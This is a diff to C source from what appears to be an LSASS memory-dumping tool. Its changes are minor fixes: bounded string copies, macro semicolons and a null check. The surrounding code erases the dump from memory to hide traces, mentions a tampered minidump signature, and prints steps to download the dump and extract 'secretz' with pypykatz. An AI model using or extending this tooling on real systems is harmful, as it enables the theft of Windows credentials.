@@ -32,7 +32,7 @@ VOID get_full_path(
     wchar_t wcFileName[MAX_PATH];
 
     // add \??\ at the start
-    wcscpy(full_dump_path->Buffer, L"\\??\\");
+    wcsncpy(full_dump_path->Buffer, L"\\??\\", MAX_PATH);
     // if it is just a relative path, add the current directory
     if (!is_full_path(filename))
         wcsncat(full_dump_path->Buffer, get_cwd(), MAX_PATH);
@@ -90,10 +90,7 @@ BOOL write_file(
     if (status == STATUS_OBJECT_PATH_NOT_FOUND ||
         status == STATUS_OBJECT_NAME_INVALID)
     {
-        PRINT_ERR(
-            "The path '%ls' is invalid.",
-            &full_dump_path->Buffer[4]
-        )
+        PRINT_ERR("The path '%ls' is invalid.", &full_dump_path->Buffer[4]);
         return FALSE;
     }
     if (!NT_SUCCESS(status))
@@ -157,8 +154,7 @@ BOOL create_file(
     {
         PRINT_ERR(
             "The path '%ls' is invalid.",
-            &full_dump_path->Buffer[4]
-        )
+            &full_dump_path->Buffer[4]);
         return FALSE;
     }
     if (!NT_SUCCESS(status))
@@ -323,8 +319,7 @@ PVOID allocate_memory(
     {
 
         DPRINT_ERR(
-            "Could not allocate enough memory to write the dump"
-        )
+            "Could not allocate enough memory to write the dump");
         return NULL;
     }
     DPRINT(
@@ -346,6 +341,9 @@ VOID erase_dump_from_memory(
     IN PVOID base_address,
     IN SIZE_T region_size)
 {
+    if (!base_address || !region_size)
+        return;
+
     // delete all trace of the dump from memory
     memset(base_address, 0, region_size);
     // free the memory area where the dump was
@@ -528,8 +526,7 @@ VOID print_success(
     {
         PRINT(
             "The minidump has an invalid signature, restore it running:\nbash restore_signature.sh %s",
-            strrchr(dump_path, '\\')? &strrchr(dump_path, '\\')[1] : dump_path
-        )
+            strrchr(dump_path, '\\')? &strrchr(dump_path, '\\')[1] : dump_path);
     }
     if (write_dump_to_disk)
     {
@@ -537,21 +534,18 @@ VOID print_success(
         PRINT(
             "Done, to download the dump run:\ndownload %s\nto get the secretz run:\npython3 -m pypykatz lsa minidump %s",
             dump_path,
-            strrchr(dump_path, '\\')? &strrchr(dump_path, '\\')[1] : dump_path
-        )
+            strrchr(dump_path, '\\')? &strrchr(dump_path, '\\')[1] : dump_path);
 #else
         PRINT(
             "Done, to get the secretz run:\npython3 -m pypykatz lsa minidump %s",
-            strrchr(dump_path, '\\')? &strrchr(dump_path, '\\')[1] : dump_path
-        )
+            strrchr(dump_path, '\\')? &strrchr(dump_path, '\\')[1] : dump_path);
 #endif
     }
     else
     {
         PRINT(
             "Done, to get the secretz run:\npython3 -m pypykatz lsa minidump %s",
-            dump_path
-        )
+            dump_path);
     }
 }
 
